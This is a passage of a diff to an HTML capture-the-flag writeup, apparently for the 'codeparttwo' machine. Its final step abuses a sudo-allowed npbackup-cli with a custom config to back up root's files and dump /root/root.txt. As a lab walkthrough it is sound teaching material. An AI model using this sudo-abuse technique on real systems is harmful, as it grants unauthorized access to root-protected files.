@@ -106,5 +106,14 @@ repos:
     is_protected: false
 ...LOT MORE
 </code></pre>
+<br>
+<pre><code class="language-none">sudo /usr/local/bin/npbackup-cli -c npbackuproot.conf -b -f</code></pre>
+Succesful, now we can just dump the root flag:
+<pre><code class="language-none">marco@codeparttwo:~$ sudo /usr/local/bin/npbackup-cli -c npbackuproot.conf --dump /root/root.txt
+&lt;REDACTED>
+</code></pre>
+<br>
+<br>
 
+# Thank you for reading this Writeup, appreciate it <3 and I’ll soon write more!
 
